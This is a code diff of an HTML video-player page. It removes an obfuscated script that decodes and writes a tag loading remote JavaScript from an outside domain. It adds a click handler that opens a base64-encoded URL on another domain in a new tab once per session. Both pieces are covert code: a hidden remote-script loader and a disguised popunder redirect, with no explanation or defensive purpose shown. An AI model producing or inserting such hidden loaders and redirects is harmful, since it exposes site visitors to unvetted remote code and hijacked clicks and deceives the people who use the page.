@@ -35,64 +35,12 @@
         cast: {},
         aspectratio: "16:9",
       });
-    </script>
-    <script>
-      var _0x2787ae = _0x3ace;
-      function _0x3ace(_0x7858e2, _0x45fd22) {
-        var _0x207f4b = _0x207f();
-        return (
-          (_0x3ace = function (_0x3ace77, _0x2a3bd5) {
-            _0x3ace77 = _0x3ace77 - 0xaa;
-            var _0x101381 = _0x207f4b[_0x3ace77];
-            return _0x101381;
-          }),
-          _0x3ace(_0x7858e2, _0x45fd22)
-        );
-      }
-      (function (_0x501a83, _0x456d86) {
-        var _0x573363 = _0x3ace,
-          _0x3c1e6c = _0x501a83();
-        while (!![]) {
-          try {
-            var _0x5436cb =
-              -parseInt(_0x573363(0xae)) / 0x1 +
-              -parseInt(_0x573363(0xb4)) / 0x2 +
-              -parseInt(_0x573363(0xb3)) / 0x3 +
-              (parseInt(_0x573363(0xab)) / 0x4) *
-                (parseInt(_0x573363(0xac)) / 0x5) +
-              (parseInt(_0x573363(0xb5)) / 0x6) *
-                (-parseInt(_0x573363(0xb2)) / 0x7) +
-              parseInt(_0x573363(0xad)) / 0x8 +
-              (parseInt(_0x573363(0xb1)) / 0x9) *
-                (parseInt(_0x573363(0xaf)) / 0xa);
-            if (_0x5436cb === _0x456d86) break;
-            else _0x3c1e6c["push"](_0x3c1e6c["shift"]());
-          } catch (_0x200868) {
-            _0x3c1e6c["push"](_0x3c1e6c["shift"]());
-          }
-        }
-      })(_0x207f, 0xcd8d1),
-        document[_0x2787ae(0xaa)](unescape(_0x2787ae(0xb0)));
-      function _0x207f() {
-        var _0x2b1574 = [
-          "4039240dyWBKl",
-          "608431riRWpJ",
-          "110NhDxqq",
-          "%3c%73%63%72%69%70%74%0d%0a%20%20%20%20%20%20%61%73%79%6e%63%3d%22%61%73%79%6e%63%22%0d%0a%20%20%20%20%20%20%64%61%74%61%2d%63%66%61%73%79%6e%63%3d%22%66%61%6c%73%65%22%0d%0a%20%20%20%20%20%20%73%72%63%3d%22%2f%2f%6f%70%68%6f%61%63%69%74%2e%63%6f%6d%2f%31%3f%7a%3d%35%38%39%37%36%33%31%22%0d%0a%20%20%20%20%3e%3c%2f%73%63%72%69%70%74%3e",
-          "2390319FozpqA",
-          "878087fHoukJ",
-          "3849594pDcmXT",
-          "283302dlXnUl",
-          "48fssnLN",
-          "write",
-          "4ANslLE",
-          "2261695mpkRpk",
-        ];
-        _0x207f = function () {
-          return _0x2b1574;
-        };
-        return _0x207f();
-      }
+      player.on("displayClick", () => {
+        const alreadyClicked = sessionStorage.getItem("plyd");
+        if (alreadyClicked) return;
+        open(atob("Ly9iYXVwdG9zdC5uZXQvNC83MDgyNDQy"), "_blank");
+        sessionStorage.setItem("plyd", true);
+      });
     </script>
   </body>
 </html>
